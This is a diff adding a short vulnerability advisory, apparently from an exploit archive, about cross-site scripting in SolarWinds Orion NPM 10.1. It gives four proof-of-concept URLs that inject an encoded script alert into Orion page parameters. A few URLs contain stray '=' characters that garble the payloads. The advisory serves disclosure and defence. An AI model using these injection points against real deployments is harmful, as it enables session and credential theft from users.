@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/45257/info
+
+SolarWinds Orion NPM is prone to multiple cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+SolarWinds Orion Network Performance Monitor (NPM) 10.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/Orion/NetPerfMon/MapView.aspx?Map=4f89095c-35fa-4b1b-813f-231270=0225b7.OrionMap&Title=%3Cscript%3Ealert%28%27test%27%29%3C/script%3E
+
+http://www.example.com/Orion/NetPerfMon/NodeDetails.aspx?NetObject=%3Cscript%3Ealert%28=%27test%27%29%3C/script%3E
+
+http://www.example.com/Orion/NPM/InterfaceDetails.aspx?NetObject=%3Cscript%3Ealert%28%2=7test%27%29%3C/script%3E&I:100&view=InterfaceDetails
+
+http://www.example.com/Orion/NetPerfMon/CustomChart.aspx?ChartName=%3Cscript%3Ealert%28=%27test%27%29%3C/script%3E&Title=&SubTitle=&SubTitle2=&Width=0&Height=0&NetObject=I:100&CustomPollerID=&Rows=&SampleSize=1M&Period=Yesterday&PlotStyle=&FontSize=1&NetObjectPrefix=I&SubsetColor=&R=YSubsetColor=&ResourceID=57&ShowTrend=True&ReturnTo=
